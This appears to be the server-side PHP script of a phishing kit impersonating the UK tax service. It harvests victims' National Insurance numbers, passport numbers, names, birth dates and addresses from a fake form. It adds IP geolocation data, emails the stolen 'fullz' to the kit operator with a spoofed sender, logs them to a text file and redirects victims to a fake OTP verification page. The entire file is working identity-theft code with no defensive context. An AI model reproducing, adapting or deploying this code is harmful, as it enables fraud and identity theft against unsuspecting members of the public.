<?php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
	      $region=$data['geoplugin_regionName'];
		  $country=$data['geoplugin_countryName'];
		  $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];
//Filling Email to send
include('grabber.php');
//Getting UserID info from Session
$nin = $_POST['nin'];
$pasn = $_POST['pasn'];
$passn = $_POST['passn'];
$gvn = $_POST['gvn'];
$fuln = $_POST['fuln'];
$dob = $_POST['dob'];
$adrs = $_POST['adrs'];
$message="==================+[ Info ]+==================
National Insurance Number : $nin
Passport Number : $pasn
Passport Expiry date : $passn
Given Name : $gvn
Full Name : $fuln
Date Of Birth : $dob
Address : $adrs
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Country: $country
Region: $region
Time: $log_date
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";
$subject = "$us | UK T4X 8ERVIC2 Fullz";
$headers = "From: Alerts <customercare@ukt65ser9v1se.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$message,$headers);
//------ append result
$handle = fopen('xxx.txt', 'a');
fwrite($handle, $message."\n");
fclose($handle);
//---- end append result
$asp = "OTPVerification.aspx";
//$Redirect="https://www.tax.service.gov.uk/";
$Redirect="services.php?$asp".generateRandomString(180);
header("Location: $Redirect");
?>